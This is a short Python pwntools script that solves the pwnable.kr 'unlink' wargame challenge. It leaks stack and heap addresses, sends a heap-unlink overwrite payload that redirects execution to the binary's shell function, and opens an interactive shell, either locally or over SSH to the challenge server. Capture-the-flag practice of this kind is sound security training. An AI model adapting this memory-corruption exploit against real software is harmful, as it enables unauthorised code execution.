from __future__ import print_function
from pwn import *
import argparse


def leak():
    context(os="linux", arch="i386", log_level="INFO", bits=32)
    print(args)
    e=ELF("./unlink")
    shell=e.symbols["shell"]
    if args.local:
        p=process("./unlink")

    elif args.remote:
        print(">>> Connecting to pwnable.kr")
        c=ssh(user="unlink", host="pwnable.kr", port=2222, password="guest")
        p=c.process("./unlink")

    response=p.recvuntil("shell!\n")
    stack=int(response.split("\x0a")[0][-10:],16)
    heap=int(response.split("\x0a")[1][-10:],16)
    log.info("stack @ 0x{:08x}".format(stack))
    log.info("heap @ 0x{:08x}".format(heap))

    return (p, stack,heap, shell)


def overwrite():
    (p, stack, heap, shell) = leak()
    payload=    p32(shell) + \
                "A"*12 + \
                p32(heap+0xc) + \
                p32(stack+0x10)
    p.sendline(payload)
    p.interactive()

def main():
    global args
    parser=argparse.ArgumentParser()    
    parser.add_argument("-r", "--remote", action="store_true", help="Spawn shell on pwnable.kr server")
    parser.add_argument("-l", "--local", action="store_true", help="Run it locally")
    parser.set_defaults(local=False, remote=False)
    args=parser.parse_args()

    overwrite()

if __name__ == '__main__':
    main()
#payload=p32(shell)+"A"*12+p32(heap+12)+p32(stack+16)
